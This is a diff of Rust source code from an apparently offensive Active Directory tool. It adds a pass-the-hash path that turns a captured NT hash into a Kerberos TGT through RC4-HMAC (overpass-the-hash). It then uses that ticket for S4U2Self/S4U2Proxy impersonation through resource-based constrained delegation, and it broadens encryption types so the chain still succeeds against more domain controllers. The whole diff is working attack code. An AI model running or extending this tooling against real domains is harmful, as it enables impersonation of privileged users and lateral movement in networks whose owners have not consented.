@@ -364,6 +364,56 @@ pub async fn asktgt(user: &str, realm: &str, kdc: &str, password: &str) -> Resul
     crate::pkinit::build_ccache(&as_rep, &enc_part, &realm, user)
 }
 
+/// Stream 5 / A.7: obtain a live `Tgt` (session key + ticket) from just an NT hash — the
+/// in-memory counterpart to [`overpass_the_hash`], which returns a serialized ccache. Used by
+/// `attack rbcd --nt-hash` and any callsite that needs to fold an S4U/TGS chain on top of a
+/// pass-the-hash TGT without a temporary ccache round-trip. Same wire behaviour: single AS-REQ
+/// with PA-ENC-TIMESTAMP encrypted under RC4-HMAC (the NT hash *is* the Kerberos key).
+pub async fn get_tgt_by_hash(user: &str, realm: &str, kdc: &str, nt: &[u8; 16]) -> Result<Tgt> {
+    let realm = realm.to_uppercase();
+    let user = user.split('@').next().unwrap_or(user);
+    let user = user.rsplit('\\').next().unwrap_or(user);
+    let etype = ETYPE_RC4_HMAC;
+
+    let ts = PaEncTsEnc {
+        patimestamp: ExplicitContextTag0::from(now_kerberos_time()),
+        pausec: Optional::from(None),
+    };
+    let ts_der = picky_asn1_der::to_vec(&ts).map_err(|e| anyhow!("encode PA-TS: {e}"))?;
+    let enc_ts = crate::rc4::encrypt(nt, PA_ENC_TIMESTAMP_KEY_USAGE, &ts_der, None);
+    let padata = PaData {
+        padata_type: ExplicitContextTag1::from(IntegerAsn1(vec![0x02])),
+        padata_data: ExplicitContextTag2::from(OctetStringAsn1(
+            picky_asn1_der::to_vec(&encrypted_data(etype, enc_ts))
+                .map_err(|e| anyhow!("encode PA-TS ED: {e}"))?,
+        )),
+    };
+    let raw = picky_asn1_der::to_vec(&build_as_req_etype(&realm, user, Some(padata), etype)?)
+        .map_err(|e| anyhow!("encode AS-REQ: {e}"))?;
+    let resp = kdc_exchange(kdc, &raw).await?;
+    let as_rep: AsRep = picky_asn1_der::from_bytes(&resp).map_err(|e| {
+        match picky_asn1_der::from_bytes::<KrbError>(&resp) {
+            Ok(err) => anyhow!(
+                "AS-REQ rejected, KDC error {} (RC4 disabled on this DC? — RC4 is off by default on Server 2025)",
+                err.0.error_code.0
+            ),
+            Err(_) => anyhow!("AS-REP decode: {e}"),
+        }
+    })?;
+    let enc = &as_rep.0.enc_part.0;
+    let plain = crate::rc4::decrypt(nt, AS_REP_ENC, &enc.cipher.0 .0)
+        .map_err(|e| anyhow!("decrypt AS-REP (RC4): {e}"))?;
+    let enc_part: EncAsRepPart =
+        picky_asn1_der::from_bytes(&plain).map_err(|e| anyhow!("EncAsRepPart decode: {e}"))?;
+    let session_key = enc_part.0.key.0.key_value.0 .0.clone();
+    Ok(Tgt {
+        ticket: as_rep.0.ticket.0.clone(),
+        session_key,
+        cname: as_rep.0.cname.0.clone(),
+        crealm: realm,
+    })
+}
+
 /// Overpass-the-hash: obtain a TGT from just an NT hash via RC4-HMAC (etype 23) — the legacy
 /// (RC4-enabled, Server ≤2022) path. No salt discovery needed: the RC4 Kerberos key *is* the NT
 /// hash, so a captured/pass-the-hash NT hash becomes a full Kerberos TGT (ccache).
@@ -975,7 +1025,15 @@ pub async fn s4u2self(
         vec![ap_req_padata(tgt)?, pa_for_user(tgt, impersonate)?],
         [0x40, 0x01, 0x00, 0x00], // forwardable | canonicalize
         vec![],
-        &[crate::ETYPE_AES256],
+        // Stream 2 / A.4: offer the full etype-preference list — AES256 first,
+        // AES128 second, RC4 last. KDC picks the highest it can serve; if the
+        // trustee only supports RC4 (default when msDS-SupportedEncryptionTypes
+        // is absent on 2019/2022+), we no longer ETYPE_NOSUPP.
+        &[
+            crate::ETYPE_AES256,
+            crate::ETYPE_AES128,
+            crate::ETYPE_RC4_HMAC,
+        ],
     )?;
     let resp = kdc_exchange(
         kdc,
@@ -1018,7 +1076,8 @@ pub async fn s4u2proxy(
         vec![ap_req_padata(tgt)?, pa_pac_options_rbcd()?],
         [0x40, 0x03, 0x00, 0x00], // forwardable | cname-in-addl-tkt | canonicalize
         vec![self_ticket],
-        &[crate::ETYPE_AES256, ETYPE_RC4_HMAC],
+        // Stream 2 / A.4: parity with s4u2self — full etype preference list.
+        &[crate::ETYPE_AES256, crate::ETYPE_AES128, ETYPE_RC4_HMAC],
     )?;
     let resp = kdc_exchange(
         kdc,
@@ -1040,11 +1099,37 @@ pub async fn rbcd_impersonate(
     impersonate: &str,
     target_spn: &str,
 ) -> Result<u32> {
+    let tgt = get_tgt(account, password, realm, kdc).await?;
+    rbcd_impersonate_with_tgt(&tgt, account, impersonate, target_spn, kdc).await
+}
+
+/// Stream 5 / A.7: pass-the-hash variant of [`rbcd_impersonate`]. The trustee account is often a
+/// captured computer object where only the NT (RC4) hash is known — this path builds the TGT from
+/// the hash and runs the same S4U2Self/S4U2Proxy chain. Returns the enc-part etype of the final
+/// impersonation ticket.
+pub async fn rbcd_impersonate_by_hash(
+    account: &str,
+    nt: &[u8; 16],
+    realm: &str,
+    kdc: &str,
+    impersonate: &str,
+    target_spn: &str,
+) -> Result<u32> {
+    let tgt = get_tgt_by_hash(account, realm, kdc, nt).await?;
+    rbcd_impersonate_with_tgt(&tgt, account, impersonate, target_spn, kdc).await
+}
+
+async fn rbcd_impersonate_with_tgt(
+    tgt: &Tgt,
+    account: &str,
+    impersonate: &str,
+    target_spn: &str,
+    kdc: &str,
+) -> Result<u32> {
     let bare = account.split('@').next().unwrap_or(account);
     let bare = bare.rsplit('\\').next().unwrap_or(bare);
-    let tgt = get_tgt(account, password, realm, kdc).await?;
-    let self_ticket = s4u2self(&tgt, bare, impersonate, kdc).await?;
-    let svc_ticket = s4u2proxy(&tgt, self_ticket, target_spn, kdc).await?;
+    let self_ticket = s4u2self(tgt, bare, impersonate, kdc).await?;
+    let svc_ticket = s4u2proxy(tgt, self_ticket, target_spn, kdc).await?;
     let etype = svc_ticket
         .0
         .enc_part
